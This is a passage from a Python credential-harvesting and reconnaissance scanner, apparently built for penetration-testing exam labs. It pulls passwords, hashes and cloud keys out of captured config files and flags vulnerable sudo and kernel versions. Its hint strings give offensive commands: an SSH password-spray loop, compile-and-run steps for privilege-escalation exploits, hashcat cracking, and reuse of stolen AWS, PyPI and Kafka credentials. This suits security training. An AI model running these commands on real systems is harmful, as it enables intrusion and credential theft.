                                 "this doesn't apply; note the target for "
                                 "post-exam engagements"))

        # iter-243: SSH auth-method disclosure in captured verbose output
        # `ssh -v <host>` or `Authentications that can continue:` line
        # tells the operator which auth methods work. Password = try
        # FOUND-cred spray (exam-legal). publickey-only = we need a key.
        _ssh_auth_m = re.search(
            r'(?im)Authentications\s+that\s+can\s+continue\s*:\s*'
            r'([\w,\-]+)',
            text[:16384])
        if _ssh_auth_m:
            _methods = _ssh_auth_m.group(1).strip()
            _has_pw = "password" in _methods.lower()
            _has_kbi = "keyboard-interactive" in _methods.lower()
            _has_pk = "publickey" in _methods.lower()
            _ssh_h_m = re.search(
                r'(?im)^Nmap\s+scan\s+report\s+for\s+([\w.\-:]+)',
                text[:16384])
            _ssh_host = (_ssh_h_m.group(1) if _ssh_h_m else "<ssh-host>")
            if _has_pw or _has_kbi:
                # Password auth is enabled → spray with found creds.
                report.add("MEDIUM", "RECON", path, _ln(_ssh_auth_m),
                           f"SSH {_ssh_host} accepts "
                           f"{'password' if _has_pw else 'keyboard-interactive'}"
                           f" auth (methods: {_methods})",
                           hint=(f"try FOUND-cred spray (exam-legal, single "
                                 f"attempt per cred): for user in $(cat "
                                 f"users.txt); do sshpass -p 'FoundPw!' ssh "
                                 f"-o StrictHostKeyChecking=no -o "
                                 f"UserKnownHostsFile=/dev/null "
                                 f"-o PubkeyAuthentication=no "
                                 f"$user@{_ssh_host} 'id' && echo VALID:"
                                 f"$user; done  |  NO hydra/ncrack/medusa "
                                 f"(exam-BANNED brute forcers)"))
            elif _has_pk:
                report.add("INFO", "RECON", path, _ln(_ssh_auth_m),
                           f"SSH {_ssh_host} publickey-ONLY (methods: "
                           f"{_methods})",
                           hint=("need SSH key from filesystem loot; check "
                                 "~/.ssh/id_rsa, /root/.ssh/id_rsa, or "
                                 "any keys discovered via LFI/SMB share "
                                 "reads"))

    # iter-198: Sudo version detection + Baron Samedit range flag. Runs
    # BEFORE the kernel block because both blocks are cheap and independent.
    if not filters.is_doc_file(path):
        for m in _SUDO_VERSION.finditer(text):
            try:
                maj = int(m.group(1))
                minn = int(m.group(2))
                patch = int(m.group(3))
                pnum = int(m.group(4)) if m.group(4) else 0
            except (TypeError, ValueError):
                continue
            vsz = (f"{maj}.{minn}.{patch}"
                   + (f"p{pnum}" if m.group(4) else ""))
            # sudo 1.8.2 .. 1.9.5p1 inclusive
            _key = (maj, minn, patch, pnum)
            # Vulnerable if (1,8,2,0) <= v <= (1,9,5,1)
            _vuln = ((1, 8, 2, 0) <= _key <= (1, 9, 5, 1))
            report.add("INFO", "RECON", path, _ln(m),
                       f"sudo version: {vsz}",
                       hint=(f"sudo -V; sudo -l  |  cross-ref CVE-YYYY on "
                             f"searchsploit"))
            if _vuln:
                report.add("HIGH", "INTERESTING FILES", path, _ln(m),
                           f"sudo {vsz} vulnerable to CVE-2021-3156 "
                           f"(Baron Samedit)",
                           hint=("PoC: gcc -o baron $(searchsploit -m 49521 "
                                 "-r).c; ./baron - triggers heap overflow "
                                 "via sudoedit -s '\\' -> root shell. "
                                 "Works on default sudo install; no NOPASSWD "
                                 "needed. May need per-distro offsets."))
            break  # only need first match (dedup)

    # iter-198: Windows systeminfo output - OS Name + OS Version rows.
    if not filters.is_doc_file(path):
        for m in _WINDOWS_SYSTEMINFO.finditer(text):
            os_name = m.group(1).strip()
            os_ver = m.group(2).strip()
            os_extra = (m.group(3) or "").strip()
            report.add("INFO", "RECON", path, _ln(m),
                       f"Windows: {os_name}  ({os_ver}{' ' + os_extra if os_extra else ''})",
                       hint=("cross-ref build/KB against MSRC / "
                             "searchsploit windows <build> for priv-esc "
                             "PoCs; check 'systeminfo | findstr KB' for "
                             "installed patches"))
            # Legacy OS heuristic: 6.0/6.1 = Vista/7/2008, 6.2/6.3 = 8/2012
            try:
                vparts = os_ver.split(".")
                osmaj = int(vparts[0]) if vparts else 0
                osmin = int(vparts[1]) if len(vparts) > 1 else 0
            except ValueError:
                osmaj, osmin = 0, 0
            if (osmaj, osmin) < (6, 2):
                report.add("HIGH", "INTERESTING FILES", path, _ln(m),
                           f"Windows {os_ver} is Vista / 7 / Server 2008 - "
                           f"very likely EoS with many public CVEs",
                           hint=("EternalBlue MS17-010, EternalRomance MS17-010, "
                                 "SMB1 forced (nxc smb --shares), MS16-135 "
                                 "(win32k), MS16-032 (secondary logon) - all "
                                 "searchsploit-able"))
            break  # only need first systeminfo header per file

    # iter-197: Linux kernel version detection + vulnerable-CVE range flag.
    # File-gated to uname / /proc/version / hostnamectl / /etc/issue -shaped
    # inputs (or any file containing 'Linux <ver>' shape - since operators
    # dump `uname -a` output into all kinds of notes). Doc-file gate skips
    # writeups that reproduce vulnerable kernel banners as examples.
    if not filters.is_doc_file(path):
        _kern_seen = set()
        for m in _KERNEL_VERSION.finditer(text):
            try:
                maj, minn, patch = int(m.group(1)), int(m.group(2)), int(m.group(3))
            except (TypeError, ValueError):
                continue
            # Sanity: reject silly numbers (Java "Linux 8.0.152" etc. from
            # random logs) - real kernel majors are 2..7 for years covered
            # here.
            if maj < 2 or maj > 7:
                continue
            ver = (maj, minn, patch)
            if ver in _kern_seen:
                continue
            _kern_seen.add(ver)
            vsz = f"{maj}.{minn}.{patch}"
            # RECON: log the kernel version regardless of CVE match
            report.add("INFO", "RECON", path, _ln(m),
                       f"Linux kernel: {vsz}",
                       hint=(f"cross-ref against public PoCs by version; "
                             f"searchsploit linux kernel {maj}.{minn}"))
            # ---- CVE range checks ----
            # DirtyPipe: 5.8.0 <= v < 5.16.11
            if (5, 8, 0) <= ver < (5, 16, 11):
                report.add("HIGH", "INTERESTING FILES", path, _ln(m),
                           f"kernel {vsz} vulnerable to CVE-2022-0847 (DirtyPipe)",
                           hint=("PoC: github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits "
                                 "(offline copy on Kali /usr/share/exploitdb); "
                                 "compile on target: gcc dirtypipe.c -o dp && ./dp"))
            # DirtyCow: v < 4.8.3
            if ver < (4, 8, 3):
                report.add("HIGH", "INTERESTING FILES", path, _ln(m),
                           f"kernel {vsz} vulnerable to CVE-2016-5195 (DirtyCow)",
                           hint=("PoC: searchsploit -m 40611 (dirtycow); "
                                 "beware CoW race - may crash sshd. Use "
                                 "root-shell.c PoC (safer)."))
            # Sequoia (fs layer): 3.16.0 <= v < 5.13.13 (roughly)
            if (3, 16, 0) <= ver < (5, 13, 13):
                report.add("HIGH", "INTERESTING FILES", path, _ln(m),
                           f"kernel {vsz} vulnerable to CVE-2021-33909 (Sequoia)",
                           hint=("searchsploit sequoia; requires local user + "
                                 "empty tmpfs to mount. Reliability varies."))
            # NF-tables: 5.13-6.4 (broad, several UAF over years)
            if (5, 13, 0) <= ver < (6, 4, 0):
                report.add("MEDIUM", "INTERESTING FILES", path, _ln(m),
                           f"kernel {vsz} may be vulnerable to nf_tables UAF "
                           f"family (CVE-2022-32250 / CVE-2023-32233 / etc.)",
                           hint=("test each by CVE-year with `searchsploit "
                                 "nf_tables`; requires CAP_NET_ADMIN or "
                                 "unprivileged user_namespaces=1"))

    # iter-190: .htpasswd file. Filename-gated to .htpasswd / .htdigest and
    # any file named like it (backups: .htpasswd.bak, htpasswd.old). Very
    # common on Apache/nginx-hosted lab web boxes with basic-auth realms.
    _base_lc_htp = os.path.basename(path).lower()
    _htp_gate = (_base_lc_htp.startswith(".htpasswd")
                 or _base_lc_htp.startswith("htpasswd")
                 or _base_lc_htp.startswith(".htdigest")
                 or _base_lc_htp.endswith((".htpasswd", ".htdigest")))
    if _htp_gate and not filters.is_doc_file(path):
        # hash-type → hashcat mode + label
        for m in _HTPASSWD_LINE.finditer(text):
            u, h = m.group(1), m.group(2)
            if _is_cli_placeholder(u) or filters.is_canonical_sample(h):
                continue
            if h.startswith("$apr1$"):
                mode, algo = "1600", "apr1 (htpasswd)"
            elif h.startswith(("$2a$", "$2b$", "$2y$")):
                mode, algo = "3200", "bcrypt"
            elif h.startswith("{SHA}"):
                mode, algo = "100", "SHA-1"
            elif h.startswith("{SSHA}"):
                mode, algo = "111", "salted-SHA-1 (SSHA)"
            elif h.startswith("$5$"):
                mode, algo = "7400", "sha256crypt"
            elif h.startswith("$6$"):
                mode, algo = "1800", "sha512crypt"
            elif h.startswith("$y$"):
                mode, algo = "yescrypt", "yescrypt"
            else:
                mode, algo = "", "unknown"
            report.add("CRITICAL", "PASSWORD HASHES", path, _ln(m),
                       f".htpasswd {algo} user '{u}': {h[:60]}"
                       f"{'...' if len(h) > 60 else ''}",
                       hint=(f"hashcat -m {mode} <hash.txt> rockyou.txt  |  "
                             f"basic-auth realm: curl -u '{u}:<pw>' <url>"
                             if mode else
                             f"identify hash format then crack; format "
                             f"unclear from prefix"))
            HASHES.append((mode, algo, h, path, _ln(m)))

    # iter-190: AWS credentials INI block. Filename gate: ~/.aws/credentials
    # or ~/.aws/config, OR file contains multiple `[profile]` headers AND
    # `aws_access_key_id` markers. The block dispatcher captures profile +
    # key ID + secret so downstream can reuse both halves.
    _aws_gate = (_base_lc_htp in ("credentials", "config") and "/.aws/" in _plow_cf.replace("\\", "/")
                 or _plow_cf.endswith((".aws/credentials", ".aws/config"))
                 or ("aws_access_key_id" in text[:8000] and "aws_secret_access_key" in text[:8000]))
    _aws_seen = set()
    if _aws_gate and not filters.is_doc_file(path):
        for m in _AWS_CREDS_INI.finditer(text):
            profile, akid, secret = m.group(1), m.group(2), m.group(3)
            key = (profile, akid)
            if key in _aws_seen:
                continue
            _aws_seen.add(key)
            if _is_cli_placeholder(profile) or filters.is_canonical_sample(secret):
                continue
            _tmp = akid.startswith("ASIA")
            report.add("CRITICAL", "ASSIGNED SECRETS", path, _ln(m),
                       f"AWS creds [{profile}]: {akid} / secret {secret[:20]}"
                       f"{'...' if len(secret) > 20 else ''}"
                       + ("  (STS temporary)" if _tmp else ""),
                       hint=(f"aws configure set aws_access_key_id "
                             f"{akid} --profile {profile}; "
                             f"aws configure set aws_secret_access_key "
                             f"'{secret}' --profile {profile}; "
                             f"aws sts get-caller-identity --profile "
                             f"{profile}"))
            if store is not None:
                store.add(Evidence(kind="plaintext", plaintext=secret,
                                   source=path, line=_ln(m),
                                   meta={"aws_profile": profile,
                                         "aws_access_key_id": akid,
                                         "temporary": _tmp}))

    # iter-196: pfSense / OPNsense config.xml admin user blocks. File-gated
    # to XML paths OR text containing '<pfsense>' / '<opnsense>' root marker.
    _plow_pf = path.lower().replace("\\", "/")
    _pfsense_gate = (_plow_pf.endswith((".xml", ".conf"))
                     and ("<pfsense>" in text[:2000]
                          or "<opnsense>" in text[:2000]
                          or "config.xml" in _plow_pf
                          or "pfsense" in _plow_pf or "opnsense" in _plow_pf))
    if _pfsense_gate and not filters.is_doc_file(path):
        _pf_seen = set()
        for m in _PFSENSE_USER.finditer(text):
            u, h = m.group(1).strip(), m.group(2)
            key = (u, h)
            if key in _pf_seen:
                continue
            _pf_seen.add(key)
            if _is_cli_placeholder(u) or filters.is_canonical_sample(h):
                continue
            _u_sh_pf = u.replace("'", "'\\''")
            report.add("CRITICAL", "PASSWORD HASHES", path, _ln(m),
                       f"pfSense admin user '{u}' bcrypt: {h[:40]}"
                       f"{'...' if len(h) > 40 else ''}",
                       hint=(f"hashcat -m 3200 <hash.txt> rockyou.txt  |  "
                             f"pfSense WebGUI login: "
                             f"https://<fw>/index.php  as '{_u_sh_pf}'"))
            HASHES.append(("3200", "bcrypt (pfSense)", h, path, _ln(m)))

    # iter-196: .pypirc INI file - PyPI upload credentials. Filename-gated to
    # .pypirc / pypirc / pypi.ini or paths under .config/pip/.
    _pypirc_gate = (os.path.basename(_plow_pf) in (".pypirc", "pypirc", "pypi.ini")
                    or "/.pypirc" in _plow_pf
                    or _plow_pf.endswith(".pypirc"))
    if _pypirc_gate and not filters.is_doc_file(path):
        _pyp_seen = set()
        for m in _PYPIRC_BLOCK.finditer(text):
            section, u, pw = m.group(1), m.group(2).strip(), m.group(3).strip()
            if (section, u) in _pyp_seen:
                continue
            _pyp_seen.add((section, u))
            if filters.is_placeholder(pw):
                continue
            _u_sh_py = u.replace("'", "'\\''")
            _pw_sh_py = pw.replace("'", "'\\''")
            _is_token = (u == "__token__" or pw.startswith(("pypi-", "testpypi-")))
            _label = "PyPI API token" if _is_token else "PyPI cred"
            report.add("CRITICAL", "ASSIGNED SECRETS", path, _ln(m),
                       f".pypirc [{section}] {_label}: {u}:{pw[:40]}"
                       f"{'...' if len(pw) > 40 else ''}",
                       hint=(f"twine upload -u '{_u_sh_py}' -p '{_pw_sh_py}' "
                             f"dist/*  |  or pip install --index-url "
                             f"https://{_u_sh_py}:{_pw_sh_py}@pypi.org/simple/ "
                             f"<pkg>  (private index authenticated pull)"))
            if store is not None:
                store.add(Evidence(kind="plaintext", user=u, plaintext=pw,
                                   source=path, line=_ln(m)))

    # iter-195: iSCSI iscsid.conf and per-node config. File-gated to
    # /etc/iscsi/ paths OR filenames containing 'iscsid'/'iscsi'.
    _plow_isc = path.lower().replace("\\", "/")
    _iscsi_gate = ("/etc/iscsi/" in _plow_isc or "iscsid" in _plow_isc
                   or "iscsi.conf" in _plow_isc
                   or _plow_isc.endswith(("/iscsid.conf", ".iscsi")))
    if _iscsi_gate and not filters.is_doc_file(path):
        _isc_seen = set()
        for m in _ISCSI_AUTH.finditer(text):
            scope = m.group(1)  # 'node' or 'discovery'
            u, p = m.group(2).strip(), m.group(3).strip()
            key = (u, p)
            if key in _isc_seen:
                continue
            _isc_seen.add(key)
            if _is_cli_placeholder(u) or filters.is_placeholder(p):
                continue
            _u_sh_isc = u.replace("'", "'\\''")
            _p_sh_isc = p.replace("'", "'\\''")
            report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                       f"iSCSI CHAP ({scope}): {u}:{p}",
                       hint=(f"iscsiadm -m discovery -t sendtargets -p "
                             f"<portal-ip>  |  iscsiadm -m node -T <iqn> -l "
                             f"--login  (uses these creds); reuse as OS/SAN "
                             f"cred: nxc smb <host> -u '{_u_sh_isc}' "
                             f"-p '{_p_sh_isc}'"))
            if store is not None:
                store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                                   source=path, line=_ln(m),
                                   meta={"iscsi_scope": scope}))

    # iter-195: Elasticsearch xpack + related YAML passwords. File-gated to
    # elasticsearch.yml/kibana.yml/logstash.yml/apm-server.yml (or filenames
    # containing 'elastic'/'kibana'/'logstash').
    _es_gate = (_plow_isc.endswith(("elasticsearch.yml", "kibana.yml",
                                     "logstash.yml", "apm-server.yml",
                                     "beat.yml", "beats.yml"))
                or any(t in _plow_isc for t in ("/elasticsearch/",
                                                  "/kibana/", "/logstash/"))
                or "xpack.security" in text[:8000])
    if _es_gate and not filters.is_doc_file(path):
        _es_seen = set()
        for m in _ES_XPACK_PW.finditer(text):
            key_name = m.group(1)
            val = m.group(2).strip()
            if (key_name, val) in _es_seen:
                continue
            _es_seen.add((key_name, val))
            if filters.is_placeholder(val):
                continue
            # skip variable references ${SEC_PW} / {{ vault_es_pw }}
            if val.startswith(("${", "{{", "$(")):
                continue
            _val_sh_es = val.replace("'", "'\\''")
            # If key is `elastic.username`, treat as user hint only (LOW)
            if key_name.endswith(".username"):
                report.add("MEDIUM", "RECON", path, _ln(m),
                           f"Elasticsearch username: {key_name} = {val}",
                           hint=f"pair with 'elastic.password' from same file")
                continue
            report.add("CRITICAL", "ASSIGNED SECRETS", path, _ln(m),
                       f"Elasticsearch {key_name}: {val}",
                       hint=(f"curl -k -u elastic:'{_val_sh_es}' "
                             f"https://<es-host>:9200/_security/user  |  "
                             f"if this is a keystore pw: use with "
                             f"bin/elasticsearch-keystore"))
            if store is not None:
                store.add(Evidence(kind="plaintext", plaintext=val,
                                   source=path, line=_ln(m),
                                   meta={"es_key": key_name}))

    # iter-192: PPP chap-secrets / pap-secrets. Filename-gated to
    # basenames containing 'chap-secrets' / 'pap-secrets' or path under
    # /etc/ppp/. The regex is broad so gate is essential to avoid FP on
    # generic space-separated config files.
    _plow_ppp = path.lower().replace("\\", "/")
    _ppp_gate = ("chap-secrets" in _plow_ppp or "pap-secrets" in _plow_ppp
                 or ("/etc/ppp/" in _plow_ppp and "secrets" in _plow_ppp))
    if _ppp_gate and not filters.is_doc_file(path):
        _ppp_seen = set()
        for m in _PPP_SECRETS.finditer(text):
            client = m.group(1).strip()
            server = m.group(2).strip()
            secret = (m.group(3) or m.group(4) or "").strip()
            ip = (m.group(5) or "").strip()
            key = (client, server, secret)
            if key in _ppp_seen:
                continue
            _ppp_seen.add(key)
            # skip comment / header rows via a lightweight sanity check
            # (secret should not look like `IP` word or `addresses`)
            if secret.lower() in ("addresses", "ip", "server", "*"):
                continue
            if (_is_cli_placeholder(client) or filters.is_placeholder(secret)
                    or secret.lower() in ("server", "client")):
                continue
            _c_sh_p = client.replace("'", "'\\''")
            _s_sh_p = secret.replace("'", "'\\''")
            report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                       f"PPP cred: {client}:{secret}"
                       + (f"  -> {server}" if server != "*" else "")
                       + (f"  (IP: {ip})" if ip and ip != "*" else ""),
                       hint=(f"PPP/PPTP/L2TP dial-up cred; often reused as "
                             f"OS/VPN auth: nxc smb <host> -u '{_c_sh_p}' "
                             f"-p '{_s_sh_p}'  |  or connect via pppd / xl2tpd"))
            if store is not None:
                store.add(Evidence(kind="plaintext", user=client,
                                   plaintext=secret, source=path, line=_ln(m)))

    # iter-191: Kafka SASL PLAIN / SCRAM JAAS config. Filename gate: only
    # fire on Kafka-shaped config paths OR when the surrounding text has
    # a Kafka marker (bootstrap.servers, security.protocol=SASL_*).
    _kafka_gate = (_plow_cf.endswith((".properties", ".yaml", ".yml", ".conf"))
                   and ("kafka" in _plow_cf or "kafka" in text[:8000].lower()
                        or "bootstrap.servers" in text[:8000]
                        or "security.protocol" in text[:8000]))
    if _kafka_gate and not filters.is_doc_file(path):
        _kafka_seen = set()
        for m in _KAFKA_JAAS.finditer(text):
            u, p = m.group(1).strip(), m.group(2).strip()
            if (u, p) in _kafka_seen:
                continue
            _kafka_seen.add((u, p))
            if _is_cli_placeholder(u) or filters.is_placeholder(p):
                continue
            _u_sh_k = u.replace("'", "'\\''")
            _p_sh_k = p.replace("'", "'\\''")
            report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                       f"Kafka SASL cred: {u}:{p}",
                       hint=(f"kafka-console-consumer.sh --bootstrap-server "
                             f"<host>:9092 --topic <topic> --consumer-property "
                             f"'sasl.jaas.config=org.apache.kafka.common.security"
                             f".plain.PlainLoginModule required username=\""
                             f"{_u_sh_k}\" password=\"{_p_sh_k}\";' "
                             f"--consumer-property "
                             f"'security.protocol=SASL_PLAINTEXT'"))
            if store is not None:
                store.add(Evidence(kind="plaintext", user=u, plaintext=p,
                                   source=path, line=_ln(m)))

    # iter-191: Windows Task Scheduler XML export. RECON-only (pw isn't
    # in the XML; DPAPI-encrypted separately). File-gated to XML paths
    # that mention TaskScheduler markers.
    _task_gate = (_plow_cf.endswith((".xml", ".txt"))
                  and ("schtasks" in _plow_cf or "taskscheduler" in _plow_cf
                       or "scheduledtask" in _plow_cf
                       or "<Task" in text[:2000]
                       or "schemas.microsoft.com/windows/2004/02/mit/task" in text[:8000]))
    if _task_gate and not filters.is_doc_file(path):
        _task_seen = set()
        for m in _TASK_SCHED_XML.finditer(text):
            u, ltype = m.group(1).strip(), m.group(2)
            key = (u, ltype)
            if key in _task_seen:
                continue
            _task_seen.add(key)
            if _is_cli_placeholder(u):
                continue
            # skip SYSTEM / LocalService / NetworkService (built-in accounts)
            if u.lower() in ("s-1-5-18", "system", "localsystem",
                             "nt authority\\system", "local service",
                             "nt authority\\local service",
                             "network service",
                             "nt authority\\network service"):
                continue
            _u_sh_ts = u.replace("'", "'\\''")
            report.add("HIGH", "RECON", path, _ln(m),
                       f"Task Scheduler runs as '{u}' ({ltype})",
                       hint=(f"service account with stored pw - if we own the "
                             f"host, try mimikatz sekurlsa::credman  or "
                             f"schtasks /query /XML /TN <TaskName> and then "
                             f"reg query for the encrypted secret; else spray "
                             f"the account: nxc smb <host> -u '{_u_sh_ts}' "
                             f"-p '<candidate>'"))
            if store is not None:
                # Track the account name so correlate.py can pair with a
                # later-recovered pw / NT hash.
                store.add(Evidence(kind="user", user=u, source=path,
                                   line=_ln(m),
                                   meta={"logon_type": ltype}))

    # iter-188: JBoss/WildFly mgmt-users.properties + application-users.properties.
    # Very common on Java-heavy lab boxes. The file lives in
    # <jboss>/standalone/configuration/ (AS7+/WildFly) or
    # <jboss>/server/<profile>/conf/props/ (AS5-6). Each active line is
    # `username=HEX32` where the hex is HEX_MD5(username:realm:password).
    # Default realms are 'ManagementRealm' and 'ApplicationRealm'. Feed to
    # HASHES with hashcat -m 501 (JBoss AS 7 - hashcat calls it 'DAHUA'
    # incorrectly; -m 501 works for JBoss digest). Filename-gated.
    _base_lc = os.path.basename(path).lower()
    _jboss_gate = _base_lc in ("mgmt-users.properties", "application-users.properties",
                                "management-users.properties")
    if _jboss_gate and not filters.is_doc_file(path):
        # Also try to sniff the realm from the file header
        _realm_m = re.search(r'(?im)^\s*#[^\r\n]*\brealm[^\r\n]*?=\s*(\S+)', text)
        realm = (_realm_m.group(1).strip() if _realm_m else
                 ("ManagementRealm" if "mgmt" in _base_lc or "management" in _base_lc
                  else "ApplicationRealm"))
        for m in _JBOSS_MGMT_USER.finditer(text):
            u, h = m.group(1), m.group(2).lower()
            # iter-187 lesson: `admin` is in filters.is_placeholder's
            # placeholder-word list, but is a real JBoss admin username.
            # Use the narrow _is_cli_placeholder helper.
            if _is_cli_placeholder(u) or filters.is_canonical_sample(h):
                continue
            # Skip commented lines (lines beginning with '#'). _JBOSS_MGMT_USER
            # is line-anchored so a '#' before the username would fail the
            # `[a-zA-Z]` lead char, but a leading space+non-comment might
            # still bleed - a targeted comment guard on the line's
            # start position.
            _line_start = text.rfind("\n", 0, m.start()) + 1
            if text[_line_start:_line_start + 1] == "#":
                continue
            report.add("CRITICAL", "PASSWORD HASHES", path, _ln(m),
                       f"JBoss DIGEST-MD5 {realm} user '{u}': {h}",
                       hint=(f"hashcat -m 501 <hash.txt> rockyou.txt  |  "
                             f"input line: '{u}:{realm}:{h}'  (JBoss digest "
                             f"format)  |  admin console: <jboss>/console"))
            HASHES.append(("501", "JBoss DIGEST-MD5", h, path, _ln(m)))

    # iter-207: Postfix /etc/postfix/sasl_passwd relay auth. Filename-gated
    # to `sasl_passwd` / `sasl_passwd.map` / `smtp_sasl_password_maps` OR
    # path segment `/postfix/` to avoid FP on nmap output containing
    # `[host]:port` shapes.
    _plow_pfx = path.lower().replace("\\", "/")
    _base_pfx = os.path.basename(_plow_pfx)
    _pfx_gate = (_base_pfx in ("sasl_passwd", "sasl_passwd.map",
                                "smtp_sasl_password_maps",
                                "smtp_sasl_password_maps.map")
                 or "/postfix/" in _plow_pfx)
    if _pfx_gate and not filters.is_doc_file(path):
        for m in _POSTFIX_SASL.finditer(text):
            host, port = m.group(1).strip(), (m.group(2) or "").strip()
            user, pw = m.group(3).strip(), m.group(4).strip()
            # NOTE: filters.is_placeholder treats 'admin'/'root'/etc as
            # placeholders because they're default-config seed words. In a
            # sasl_passwd file those ARE real SMTP relay users, so we skip
            # the user check and rely on pw placeholder + doc-file gate.
            if filters.is_placeholder(pw):
                continue
            _u_sh_pfx = user.replace("'", "'\\''")
            _p_sh_pfx = pw.replace("'", "'\\''")
            # iter-222 audit fix: IPv6 hosts get bracket-wrapped so the
            # printed target is unambiguous: `[2001:db8::1]:587` not
            # `2001:db8::1:587` where the trailing :587 is confused for
            # a hextet.
            _host_disp = f"[{host}]" if ":" in host else host
            _target = _host_disp + (f":{port}" if port else "")
            report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                       f"Postfix SMTP relay auth ({_target}): {user}:{pw}",
                       hint=(f"swaks --to test@target --server {_target} "
                             f"-au '{_u_sh_pfx}' -ap '{_p_sh_pfx}'  |  also "
                             f"try SMB/IMAP/webmail reuse; SMTP creds often "
                             f"shared with mailbox creds"))
            if store is not None:
                store.add(Evidence(kind="plaintext", user=user, plaintext=pw,
                                   host=host, source=path, line=_ln(m)))

    # iter-207: OpenLDAP admin credential (slapd.conf `rootpw` or
    # cn=config `olcRootPW`). Filename-gated to slapd.conf / *.ldif /
    # path segment `/openldap/` / `/slapd.d/` to avoid FP on generic
    # `rootpw:` mentions in prose.
    _ldap_gate = (_base_pfx in ("slapd.conf", "olcdatabase.ldif")
                  or _plow_pfx.endswith((".ldif", ".ldap"))
                  or "/openldap/" in _plow_pfx
                  or "/slapd.d/" in _plow_pfx
                  or "olcRootPW" in text[:8000]
                  or re.search(r'(?im)^\s*rootpw\s+\S', text[:8000]))
    if _ldap_gate and not filters.is_doc_file(path):
        _ldap_seen = set()
        for m in _LDAP_ROOTPW.finditer(text):
            sep = m.group(1) or ""
            raw_val = m.group(2).strip()
            if raw_val in _ldap_seen:
                continue
            _ldap_seen.add(raw_val)
            if filters.is_placeholder(raw_val):
                continue
            # `::` in LDIF signals base64 - try to decode.
            val = raw_val
            if sep == "::":
                try:
                    import base64 as _b64
                    val = _b64.b64decode(raw_val, validate=False).decode(
                        "utf-8", errors="replace")
                except Exception:
                    val = raw_val
            if val.startswith(("{SSHA}", "{SHA}", "{SMD5}", "{MD5}",
                                "{CRYPT}", "{ARGON2}", "{PBKDF2}")):
                _mode, _algo = "", "LDAP-hashed"
                if val.startswith("{SSHA}"):
                    _mode, _algo = "111", "SSHA (LDAP)"
                elif val.startswith("{SHA}"):
                    _mode, _algo = "101", "SHA-1 (LDAP)"
                elif val.startswith("{SMD5}"):
                    _mode, _algo = "121", "SMD5 (LDAP)"
                elif val.startswith("{MD5}"):
                    _mode, _algo = "100", "MD5"
                elif val.startswith("{CRYPT}"):
                    _sub = val[len("{CRYPT}"):]
                    if _sub.startswith("$6$"):
                        _mode, _algo = "1800", "sha512crypt ({CRYPT})"
                    elif _sub.startswith("$5$"):
                        _mode, _algo = "7400", "sha256crypt ({CRYPT})"
                    elif _sub.startswith("$1$"):
                        _mode, _algo = "500", "md5crypt ({CRYPT})"
                    else:
                        _mode, _algo = "1500", "descrypt ({CRYPT})"
                report.add("CRITICAL", "PASSWORD HASHES", path, _ln(m),
                           f"OpenLDAP directory-manager hash ({_algo}): "
                           f"{val[:60]}{'...' if len(val) > 60 else ''}",
                           hint=(f"hashcat -m {_mode} <hash.txt> rockyou.txt"
                                 f"  |  OpenLDAP directory admin - `ldapsearch"
                                 f" -x -H ldap://<host> -D 'cn=admin,dc=corp"
                                 f",dc=local' -W` uses this"))
                if _mode:
                    HASHES.append((_mode, _algo, val, path, _ln(m)))
            else:
                # cleartext rootpw
                _val_sh_ldap = val.replace("'", "'\\''")
                report.add("CRITICAL", "CRED PAIRS", path, _ln(m),
                           f"OpenLDAP directory-manager cleartext: {val}",
                           hint=(f"ldapsearch -x -H ldap://<host> "
                                 f"-D 'cn=admin,dc=corp,dc=local' "
                                 f"-w '{_val_sh_ldap}' -b 'dc=corp,dc=local'"
                                 f"  |  read every LDAP entry; often reused "
                                 f"as admin OS cred"))
                if store is not None:
                    store.add(Evidence(kind="plaintext", plaintext=val,
                                       source=path, line=_ln(m)))

    # iter-208: Dovecot passwd-file (IMAP/POP3 mailbox creds). Filename-
    # gated so /etc/passwd and htpasswd files never trigger this branch;
    # a content-signal fallback catches oddly-named dovecot dumps.
    _dov_gate = (_base_pfx in ("dovecot-users", "dovecot.users",
                                "dovecot-passwd", "passwd-file",
                                "users.db", "virtual-users")
                 or "/dovecot/" in _plow_pfx
                 or "/vmail/" in _plow_pfx
                 or (_base_pfx == "users" and "/dovecot" in _plow_pfx)
                 or ("dovecot" in text[:2048].lower()
                     and "passdb" in text[:4096].lower()))
    if _dov_gate and not filters.is_doc_file(path):
        _dov_seen = set()
        for m in _DOVECOT_PASSWD.finditer(text):
            user = m.group(1).strip()
            scheme = (m.group(2) or "").strip("{}").upper()
            val = m.group(3).strip()
            # dedupe on (user, first-32-of-val)
            _k = (user, val[:32])
            if _k in _dov_seen:
                continue
            _dov_seen.add(_k)
            if filters.is_placeholder(val):
                continue
            # Reject lines where val is clearly a shell/false marker.
            if val in ("x", "!", "*", "!!"):
                continue
            _u_sh_dov = user.replace("'", "'\\''")
            if scheme:
                # Hashed - map scheme to hashcat mode.
                _mode, _algo = "", f"Dovecot-{scheme}"
                if scheme in ("PLAIN", "CLEARTEXT", "CLEAR"):
                    _mode = ""  # not a hash - falls through
                elif scheme == "CRYPT":
                    _mode, _algo = "1500", "descrypt (Dovecot)"
                elif scheme == "MD5-CRYPT":
                    _mode, _algo = "500", "md5crypt (Dovecot)"
                elif scheme == "SHA256-CRYPT":
                    _mode, _algo = "7400", "sha256crypt (Dovecot)"
                elif scheme == "SHA512-CRYPT":
                    _mode, _algo = "1800", "sha512crypt (Dovecot)"
                elif scheme == "SSHA":
                    _mode, _algo = "111", "SSHA (Dovecot)"
                elif scheme in ("SHA", "SHA1"):
                    _mode, _algo = "101", "SHA-1 (Dovecot)"
                elif scheme == "SHA256":
                    _mode, _algo = "1400", "SHA-256 (Dovecot)"
                elif scheme == "SHA512":
                    _mode, _algo = "1700", "SHA-512 (Dovecot)"
                elif scheme in ("MD5", "PLAIN-MD5"):
                    _mode, _algo = "100", "MD5 (Dovecot)"
                elif scheme == "SSHA256":
                    _mode, _algo = "1420", "salted SHA-256 (Dovecot SSHA256)"
                elif scheme == "SSHA512":
                    _mode, _algo = "1740", "salted SHA-512 (Dovecot SSHA512)"
                if _mode:
                    # Reconstruct hash including scheme prefix for hashcat.
                    _full_hash = "{" + scheme + "}" + val
                    report.add("CRITICAL", "PASSWORD HASHES", path, _ln(m),
                               f"Dovecot mailbox hash [{user}] ({_algo}): "
